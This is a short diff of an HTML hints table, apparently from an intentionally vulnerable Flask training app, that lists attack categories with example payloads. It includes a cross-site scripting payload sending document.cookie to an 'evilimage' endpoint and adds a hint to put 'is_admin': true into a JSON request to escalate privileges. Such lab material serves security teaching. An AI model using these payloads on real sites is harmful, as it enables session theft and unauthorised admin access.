@@ -34,9 +34,9 @@
                                                     </tr>
                                                     <tr>
                                                         <th scope="row">Cross Side Scripting Pages</th>
-														<td>&#x3C;script&#x3E;
+														<td><code>&#x3C;script&#x3E;
                                                         document.write(&#x27;&#x3C;img src=&#x22;{{ domain }}evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
-                                                        &#x3C;/script&#x3E;</td>
+                                                        &#x3C;/script&#x3E;</code></td>
                                                     </tr>
                                                     <tr>
                                                         <th scope="row">Security Misconfiguration</th>
@@ -50,8 +50,10 @@
                                                         <th scope="row">Broken Session</th>
 														<td><a href="">Flask does not encrypt cookie content, only signs it.</td>
                                                     </tr>
-												
-													
+                                                    <tr>
+                                                        <th scope="row">Parameter Tampering</th>
+														<td><a href="">Add <code>"is_admin": true</code> to the JSON request body</li></td>
+                                                    </tr>        
                                                 </tbody>
                                             </table>
                                             <br>
